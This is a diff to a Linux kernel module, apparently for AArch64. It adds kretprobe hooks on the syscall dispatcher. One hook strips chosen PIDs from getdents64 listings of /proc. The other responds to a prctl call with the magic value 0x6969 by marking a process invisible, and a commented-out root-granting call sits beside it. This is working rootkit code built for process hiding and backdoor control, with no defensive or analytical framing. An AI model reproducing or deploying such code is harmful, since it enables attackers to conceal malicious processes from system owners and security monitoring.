@@ -50,15 +50,143 @@ static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 // struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
     uint64_t v4;
-    return 0;
+	struct my_kretprobe_data *d = (struct my_kretprobe_data *)ri->data;
+    // int v5;
+	if (/*(uint32_t)(regs->regs[1]) == 61*/d->sys_ns == 61) { // getdents64
+		// wuwa_info("dents called post");
+		int fd = d->fd; //*(int*)(regs->user_regs.regs[0]);
+		struct linux_dirent *dirent = d->dirent; // *(struct linux_dirent **) (regs->user_regs.regs[0] + 8);
+
+		unsigned short proc = 0;
+	    unsigned long offset = 0;
+	    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+
+	    //For storing the directory inode value
+	    struct inode *d_inode;
+		int ret = (int)regs_return_value(regs); // *(int*)(regs->regs[0]);
+		// wuwa_info("ret_dent2 - ret %d, pid %d fd %d", ret, pid_hide, fd);
+		int err = 0;
+
+		if(ret <= 0) return 0;
+		    
+		kdirent = kzalloc(ret, GFP_KERNEL);
+
+	    if (kdirent == NULL)
+		    return 0;
+
+	    // Copying directory name (or pid name) from userspace to kernel space
+	    err = copy_from_user(kdirent, dirent, ret);
+	    if (err)
+			goto out;
+
+		// Storing the inode value of the required directory(or pid) 
+	    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+	    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+		) {
+		    proc = 1;
+			wuwa_info("dent64: called for proc %d", ret);
+		}
+
+		// if(proc) {
+		while (offset < ret)
+	    {
+		    dir = (void *)kdirent + offset;
+
+		    if ((proc && pid_hide > 0 && /*pid_hide == simple_strtoul(dir->d_name, NULL, 10)*/ is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
+		    {			
+			    if (dir == kdirent)
+			    {
+				    ret -= dir->d_reclen;
+				    memmove(dir, (void *)dir + dir->d_reclen, ret);
+					wuwa_info("dent64: skipped");
+				    continue;
+			    }
+			    prev->d_reclen += dir->d_reclen;			
+				wuwa_info("dent64: skipped again");			
+		    }
+		    else
+		    {
+			    prev = dir;
+		    }
+		    offset += dir->d_reclen;
+	    }
+	
+	    // Copying directory name (or pid name) from kernel space to user space, after changing
+	    err = copy_to_user(dirent, kdirent, ret);
+	
+	    if (err)
+	    {
+	        goto out;
+	    }
+		// }
+
+	out:
+	    kfree(kdirent);
+	    return 0;
+
+	}
+	return 0;
 }
+
+struct prctl_cf {
+    int pid;
+    uintptr_t addr;
+    void* buffer;
+    int size;
+};
 
 static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 // struct kprobe *p, struct pt_regs *regs)
 {
     uint64_t v4;
-    return 1;
+    // int v5;
+	struct my_kretprobe_data *d = (struct my_kretprobe_data *)ri->data;
+	d->sys_ns = 0;
+
+	if ((uint32_t)(regs->regs[1]) == 61) { // getdents64			
+		int fd = *(int*)(regs->user_regs.regs[0]);
+		struct linux_dirent *dirent = *(struct linux_dirent **) (regs->user_regs.regs[0] + 8);
+		// wuwa_info("dents called pre %d", fd);		
+		d->fd = fd;
+		d->dirent = dirent;
+		d->sys_ns = 61;
+		return 0;
+	}
+	
+    if ((uint32_t)(regs->regs[1]) == 167 /* syscall 29 on AArch64 */) {
+        v4 = regs->user_regs.regs[0];
+		// wuwa_info("prctl called");
+        // Handle memory read request
+        if (*(uint32_t *)(regs->user_regs.regs[0] + 8) == 0x6969) {
+			wuwa_info("p with 6969 called");
+
+			struct prctl_cf cfp;
+            if (!copy_from_user(&cfp, *(const void **)(v4 + 16), sizeof(cfp))) {
+				wuwa_info("pid for hide %d", cfp.pid);
+				pid_hide = cfp.pid;
+				struct pid * pid_struct;
+				struct task_struct *task;
+				pid_struct = find_get_pid(cfp.pid);
+				if (!pid_struct)
+					return 1;
+				task = pid_task(pid_struct, PIDTYPE_PID);
+				if (!task)
+					return 1;		
+				task->flags ^= PF_INVISIBLE;
+			}
+			/*
+            int status = give_root();
+			if(status == 0)
+				wuwa_info("root given");
+			else
+				wuwa_info("root not given");
+			*/
+        }
+    }
+	return 1;
 }
+
 
 static struct kretprobe my_kretprobe = {
     .kp.symbol_name = "invoke_syscall", /* or use .kp.addr */
